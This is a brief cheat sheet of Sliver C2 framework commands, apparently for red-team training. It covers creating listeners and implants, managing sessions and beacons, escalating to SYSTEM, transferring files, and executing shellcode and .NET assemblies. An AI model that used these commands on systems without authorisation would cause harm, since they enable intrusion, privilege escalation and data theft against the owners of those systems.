title: Intro to C2 Operations with Sliver
html:
Intro to C2 Operations with Sliver

Displays the commands and their descriptions

help

Set up HTTP listener

http -L <Local IP> -l <Port>

Create a new C2 pofile

profiles new --http <Local IP>:<Port> --format shellcode <Profile Name>

Set up Stager lstener

stage-listener --url tcp://<Localhost:Port> --profile <Profile name>

Generates a session implant

generate --http <Local IP>:<Port> --os <OS>

Generates a beacon implant

generate beacon --http <Local IP>:<Port> --os <OS>

Lists active/inactive sessions

sessions

Removes all sessions available or not

sessions -K

Removes unavailable sessions

sessions prune

Removes the specified session

sessions -k -i <session>

Lists active/inactive beacons

beacons

Lists the pending or completed tasks ran by the operator

tasks

Attempts to get a session as NT AUTHORITY\SYSTEM

getsystem

Tasks the beacon to spawn a session that becomes interactive

interactive

Change directory

cd

Lists the contents of the directory

ls

Downloads a file/directory

download <file/directory>

Uploads a file

upload

Executes a .NET assembly in a child process

execute-assembly

Executes the specified shellcode in process

execute-shellcode

Enables multiplayer mode on the server

multiplayer

Installs the given alias/extension

armory install <alias/extension>

Installs all of the available aliases/extensions

armory install all
